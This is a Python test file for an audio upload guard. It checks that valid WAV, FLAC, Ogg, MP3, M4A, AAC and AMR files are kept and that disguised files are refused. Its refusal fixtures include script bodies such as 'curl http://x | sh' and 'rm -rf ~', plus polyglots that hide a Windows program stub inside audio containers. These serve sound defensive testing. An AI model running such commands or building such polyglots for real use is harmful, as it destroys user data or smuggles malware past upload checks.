"""HERESY 2659: the gate every sound brought in passes (lab/upload_guard.py). Good files of the four (WAV 16-bit, float and 24-bit extensible,
FLAC 16 and 24, OGG Vorbis and Opus, MP3 with its ID3 tag and Xing header) and of the phones' voice notes (M4A of AAC and of ALAC, an MP4 of
sound alone, ADTS AAC, AMR-NB and AMR-WB, a 3GP of AMR) come in and are kept under the Studio's own name with the extension their bytes
showed; refused, with words saying why, and nothing left on disk: a renamed program, a ZIP, a script, a picture as .m4a, polyglots (a WAV
around a Windows program, a WAV ending in a ZIP, a ZIP after a WAV or an M4A, an M4A with a program in a free box, an ID3 tag, a FLAC header,
an Ogg page, an AMR or ADTS header before junk), truncated files of each kind, a damaged Ogg page, MP2 (.mpa), AIFF, an ADPCM WAV, an Ogg of
FLAC, an MP4 with a video, an MP4 of MP3, an empty and an oversized one.
    python3 lab/test_upload_guard.py   (files made by ffmpeg in a temporary folder; nothing else touched)"""
import io
import shutil
import subprocess
import sys
import tempfile
import zipfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import upload_guard as ug  # noqa: E402

passed = failed = 0
T = Path(tempfile.mkdtemp(prefix="upload-guard-test-"))


def check(name, ok, detail=""):
    global passed, failed
    passed, failed = passed + bool(ok), failed + (not ok)
    print(("  PASS  " if ok else "  FAIL  ") + name + ("" if ok or not detail else "  (" + str(detail) + ")"))


def make(name, *args, seconds=3):
    out = T / name
    subprocess.run(["ffmpeg", "-v", "error", "-y", "-f", "lavfi", "-i", f"sine=frequency=440:duration={seconds}:sample_rate=48000",
                    "-f", "lavfi", "-i", f"sine=frequency=660:duration={seconds}:sample_rate=48000", "-filter_complex", "amerge=inputs=2",
                    *args, str(out)], check=True)
    return out.read_bytes()


def kept(name, body, kind):
    d = T / ("keep-" + name)
    try:
        out, info = ug.keep(body, d, "original")
        check(f"{name}: comes in as {kind}, kept as original{ug.EXT[kind]}, {info['seconds']} s",
              info["kind"] == kind and out.name == "original" + ug.EXT[kind] and abs(info["seconds"] - 3) < 0.1 and
              sorted(p.name for p in d.iterdir()) == [out.name], info)
    except ug.Refused as e:
        check(f"{name}: comes in as {kind}", False, e)


def refused(name, body, words, limit_mb=ug.LIMIT_MB):
    d = T / ("refuse-" + name)
    d.mkdir()
    try:
        ug.keep(body, d, "original", limit_mb=limit_mb)
        check(f"{name}: refused", False, "it came in")
    except ug.Refused as e:
        check(f"{name}: refused, {e}", words in str(e) and not list(d.iterdir()), f"{e} / left: {list(d.iterdir())}")


good = {
    "wav16": (make("a.wav", "-c:a", "pcm_s16le"), "wav"),
    "wav-float": (make("f.wav", "-c:a", "pcm_f32le"), "wav"),
    "wav24-extensible": (make("e.wav", "-c:a", "pcm_s24le"), "wav"),
    "flac16": (make("a.flac", "-c:a", "flac", "-sample_fmt", "s16"), "flac"),
    "flac24": (make("b.flac", "-c:a", "flac", "-sample_fmt", "s32", "-bits_per_raw_sample", "24"), "flac"),
    "ogg-vorbis": (make("a.ogg", "-c:a", "libvorbis"), "ogg"),
    "ogg-opus": (make("a.opus", "-c:a", "libopus"), "ogg"),
    "mp3-id3-xing": (make("a.mp3", "-c:a", "libmp3lame", "-b:a", "192k", "-metadata", "title=Где Ты"), "mp3"),
}
print("the four come in")
for k, (b, kind) in good.items():
    kept(k, b, kind)
check("wav24: its fmt is the extensible form (0xFFFE), read through to PCM", good["wav24-extensible"][0][20:22] == b"\xfe\xff")
check("mp3: it has its ID3 tag and a Xing/Info header", good["mp3-id3-xing"][0][:3] == b"ID3" and
      (b"Xing" in good["mp3-id3-xing"][0][:4096] or b"Info" in good["mp3-id3-xing"][0][:4096]))
mp3_bare = good["mp3-id3-xing"][0][ug._id3(good["mp3-id3-xing"][0]):]
kept("mp3 without its tag (a frame at 0)", mp3_bare, "mp3")
kept("mp3 with an ID3v1 tag closing it", good["mp3-id3-xing"][0] + b"TAG" + b"\0" * 125, "mp3")
kept("a file named .mp3 that is FLAC: told by its bytes", good["flac16"][0], "flac")

print("not one of the four")
exe = b"MZ\x90\x00" + b"\0" * 60 + b"This program cannot be run in DOS mode.\r\r\n$" + b"\0" * 400
refused("a renamed program (.exe as .wav)", exe, "an archive or a program")
z = io.BytesIO()
with zipfile.ZipFile(z, "w") as zf:
    zf.writestr("payload.sh", "rm -rf ~\n")
refused("a renamed ZIP", z.getvalue(), "an archive or a program")
refused("a script", b"#!/bin/sh\ncurl http://x | sh\n", "text or a script")
refused("MP2 (.mpa)", make("a.mpa", "-c:a", "mp2", "-f", "mp2"), "another audio format")
refused("AIFF", make("a.aiff", "-c:a", "pcm_s16be", "-f", "aiff"), "another audio format")
refused("a WAV of ADPCM", make("adpcm.wav", "-c:a", "adpcm_ms"), "neither PCM nor float")
refused("an Ogg of FLAC", make("f.oga", "-c:a", "flac", "-f", "ogg"), "neither Vorbis nor Opus")
refused("empty", b"", "came empty")
refused("past the limit (1 MB for this test)", good["wav-float"][0], "past the limit of 1 MB", limit_mb=1)

print("polyglots: a good header, something else inside")
w = good["wav16"][0]
payload = exe * 8
riff = lambda data: b"RIFF" + (36 + len(data)).to_bytes(4, "little") + w[8:36] + b"data" + len(data).to_bytes(4, "little") + data
check("the WAV header the polyglots borrow: RIFF, WAVE and a plain 16-byte fmt", w[12:16] == b"fmt " and w[16:20] == (16).to_bytes(4, "little"), w[:48])
refused("a WAV around a Windows program", riff(payload + b"\0" * (len(payload) % 4)), "hides inside it")
zbody = z.getvalue()
refused("a WAV whose sound ends in a ZIP (a WAV that is a ZIP too)", riff(b"\0" * (4 - len(zbody) % 4) + zbody), "hides inside it")
refused("a ZIP after a WAV's end", w + zbody, "not sound follow its end")
refused("an ID3 tag before junk", good["mp3-id3-xing"][0][:ug._id3(good["mp3-id3-xing"][0])] + bytes(range(256)) * 64, "no three of its frames")
f = good["flac16"][0]
fh = 4
while True:                                             # past its metadata blocks: where its first frame begins
    fh, last = fh + 4 + int.from_bytes(f[fh + 1:fh + 4], "big"), f[fh] & 0x80
    if last:
        break
refused("a FLAC header before junk (a frame's sync, then junk)", f[:fh] + b"\xff\xf8\x69\x08\x00" + bytes(range(256)) * 64, "FLAC")
o = good["ogg-vorbis"][0]
first = 27 + o[26] + sum(o[27:27 + o[26]])
refused("an Ogg page before junk", o[:first] + bytes(range(256)) * 64, "damaged")

print("cut off, damaged")
for k in ("wav16", "flac16", "ogg-vorbis", "mp3-id3-xing"):
    b, kind = good[k]
    refused(f"{k} cut at 60 %", b[:len(b) * 6 // 10], ug.NAME[kind])
m = bytearray(o)
m[len(m) // 2] ^= 0x55
refused("an Ogg with one byte changed mid-file (its page's CRC)", bytes(m), "damaged")
m = bytearray(f)
m[len(m) // 2] ^= 0x55
refused("a FLAC with one byte changed mid-file (its frame's CRC, its MD5)", bytes(m), "FLAC")
refused("an Ogg with bytes after its last page", o + b"\0" * 100, "not sound follow its end")
refused("an MP3 with junk after its last frame", good["mp3-id3-xing"][0] + bytes(range(256)) * 4, "not sound follow its end")

print("the phones' voice notes")
nb = b"#!AMR\n" + b"".join(bytes([0x3C]) + bytes((i * 37 + k) % 256 for k in range(31)) for i in range(150))        # 150 frames of 12.2 kbit/s: 3 s
wb = b"#!AMR-WB\n" + b"".join(bytes([0x44]) + bytes((i * 29 + k) % 256 for k in range(60)) for i in range(150))     # 150 of 23.85 kbit/s: 3 s
(T / "nb.amr").write_bytes(nb)
subprocess.run(["ffmpeg", "-v", "error", "-y", "-i", str(T / "nb.amr"), "-c:a", "copy", "-f", "3gp", str(T / "nb.3gp")], check=True)
phone = {
    "m4a-aac (iPhone Voice Memos' kind)": (make("v.m4a", "-c:a", "aac", "-f", "ipod"), "m4a"),
    "mp4 of sound alone (isom)": (make("v.mp4", "-c:a", "aac", "-f", "mp4"), "m4a"),
    "m4a-alac": (make("l.m4a", "-c:a", "alac", "-f", "ipod"), "m4a"),
    "aac-adts": (make("v.aac", "-c:a", "aac", "-f", "adts"), "aac"),
    "amr-nb": (nb, "amr"),
    "amr-wb": (wb, "amr"),
    "3gp of AMR-NB (an older Android's)": ((T / "nb.3gp").read_bytes(), "3gp"),
}
for k, (b, kind) in phone.items():
    kept(k, b, kind)
m4a = phone["m4a-aac (iPhone Voice Memos' kind)"][0]
check("m4a: its brand is M4A, the 3gp's 3gp", m4a[8:12] == b"M4A " and phone["3gp of AMR-NB (an older Android's)"][0][8:11] == b"3gp", m4a[:16])
png = b"\x89PNG\r\n\x1a\n" + b"\0\0\0\rIHDR" + bytes(range(256)) * 4
refused("a picture renamed .m4a", png, "another kind of file")
refused("a ZIP renamed .amr", z.getvalue(), "an archive or a program")
refused("a script renamed .aac", b"#!/bin/sh\nrm -rf ~\n", "text or a script")
refused("an MP4 with a video", subprocess.run(["ffmpeg", "-v", "error", "-f", "lavfi", "-i", "testsrc=duration=2:size=64x64:rate=10", "-f", "lavfi", "-i",
                                               "sine=duration=2", "-c:v", "mpeg4", "-c:a", "aac", "-shortest", "-f", "mp4", "-movflags", "frag_keyframe+empty_moov", "pipe:1"],
                                              capture_output=True, check=True).stdout, "carries a video")
refused("an MP4 of MP3 (neither AAC, ALAC nor AMR)", make("m.mp4", "-c:a", "libmp3lame", "-f", "mp4"), "neither AAC, ALAC nor AMR")
refused("a ZIP after an M4A's last box", m4a + z.getvalue(), "M4A")
prog = exe * 2
refused("an M4A whose last box (free) holds a Windows program", m4a + (8 + len(prog)).to_bytes(4, "big") + b"free" + prog, "hides inside it")
refused("an AMR header before junk", b"#!AMR\n" + bytes(range(256)) * 8, "no three of its frames")
refused("an ADTS header before junk", phone["aac-adts"][0][:7] + bytes(range(256)) * 8, "AAC")
for k in ("m4a-aac (iPhone Voice Memos' kind)", "aac-adts", "amr-nb", "3gp of AMR-NB (an older Android's)"):
    b, kind = phone[k]
    refused(f"{k} cut at 60 %", b[:len(b) * 6 // 10], ug.NAME[kind])

print("check(): nothing kept, the tmp clean")
before = set(ug.TMP.iterdir()) if ug.TMP.is_dir() else set()
info = ug.check(good["ogg-opus"][0])
check("check() of an Opus: its info, nothing left in tmp/upload-guard", info["kind"] == "ogg" and set(ug.TMP.iterdir()) == before, info)

shutil.rmtree(T, ignore_errors=True)
print(f"\ntest_upload_guard: {passed} passed, {failed} failed")
sys.exit(1 if failed else 0)
